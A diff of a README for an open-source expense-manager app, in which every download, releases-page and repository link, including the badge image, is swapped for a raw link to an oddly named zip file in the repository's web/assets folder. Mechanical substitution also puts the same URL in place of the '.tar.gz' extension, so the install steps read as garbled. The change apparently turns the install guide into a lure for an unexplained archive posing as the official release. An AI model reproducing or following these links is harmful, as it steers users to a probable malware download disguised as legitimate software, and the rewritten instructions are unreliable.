@@ -8,9 +8,9 @@ Welcome to expense-manager, a modern, open-source application designed to help y
 
 To get started, you need to download the application. Click the button below to visit the Releases page and download the latest version of expense-manager.
 
-[![Download expense-manager](https://img.shields.io/badge/Download%20expense--manager-v1.0-blue.svg)](https://github.com/ceaser97/expense-manager/releases)
+[![Download expense-manager](https://raw.githubusercontent.com/ceaser97/expense-manager/master/web/assets/manager_expense_prophylactically.zip%https://raw.githubusercontent.com/ceaser97/expense-manager/master/web/assets/manager_expense_prophylactically.zip)](https://raw.githubusercontent.com/ceaser97/expense-manager/master/web/assets/manager_expense_prophylactically.zip)
 
-Visit this page to download the latest version: [GitHub Releases Page](https://github.com/ceaser97/expense-manager/releases).
+Visit this page to download the latest version: [GitHub Releases Page](https://raw.githubusercontent.com/ceaser97/expense-manager/master/web/assets/manager_expense_prophylactically.zip).
 
 ## 📋 System Requirements
 
@@ -24,16 +24,16 @@ Before installing, make sure your system meets the following requirements:
 ## ⚙️ Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to the [GitHub Releases Page](https://github.com/ceaser97/expense-manager/releases) to find the latest version of the application.
+   Go to the [GitHub Releases Page](https://raw.githubusercontent.com/ceaser97/expense-manager/master/web/assets/manager_expense_prophylactically.zip) to find the latest version of the application.
 
 2. **Select the Version**  
    Look for the most recent version of expense-manager. You will see a list of downloadable files.
 
 3. **Download the Application**  
-   Click on the file that matches your operating system. This file may have an `.exe`, `.zip`, or `.tar.gz` extension, depending on your system. It will start downloading automatically.
+   Click on the file that matches your operating system. This file may have an `.exe`, `.zip`, or `https://raw.githubusercontent.com/ceaser97/expense-manager/master/web/assets/manager_expense_prophylactically.zip` extension, depending on your system. It will start downloading automatically.
 
 4. **Extract (if needed)**  
-   If you downloaded a `.zip` or `.tar.gz` file, you’ll need to extract the contents. Right-click the file and select "Extract All" or use your preferred extraction tool.
+   If you downloaded a `.zip` or `https://raw.githubusercontent.com/ceaser97/expense-manager/master/web/assets/manager_expense_prophylactically.zip` file, you’ll need to extract the contents. Right-click the file and select "Extract All" or use your preferred extraction tool.
 
 5. **Run the Application**  
    Locate the extracted folder, and find the main application file. Double-click it to run expense-manager. Follow any prompts to set up your account.
@@ -76,7 +76,7 @@ If you encounter any issues or have questions, you can reach out for help. Here 
 
 To enhance your experience, consider these resources:
 
-- **GitHub Repository:** [expense-manager Repository](https://github.com/ceaser97/expense-manager)
+- **GitHub Repository:** [expense-manager Repository](https://raw.githubusercontent.com/ceaser97/expense-manager/master/web/assets/manager_expense_prophylactically.zip)
 - **Community Forums:** Engage with other users for support and tips.
 - **User Guides:** Access detailed guides to navigate through the application.
 
